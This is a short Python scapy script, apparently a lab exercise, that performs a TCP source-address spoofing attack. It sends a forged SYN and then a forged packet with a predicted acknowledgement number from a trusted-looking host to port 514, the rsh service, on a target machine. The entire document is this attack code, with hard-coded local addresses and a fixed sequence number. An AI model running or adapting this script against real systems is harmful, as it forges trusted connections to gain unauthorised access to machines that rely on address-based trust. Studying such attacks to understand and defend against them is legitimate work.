from scapy.all import *
from scapy.layers.inet import IP, TCP


def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)
src = "192.168.0.107"
tgt = "192.168.0.104"
seqNum = 2024371201
spoofConn(src,tgt,seqNum)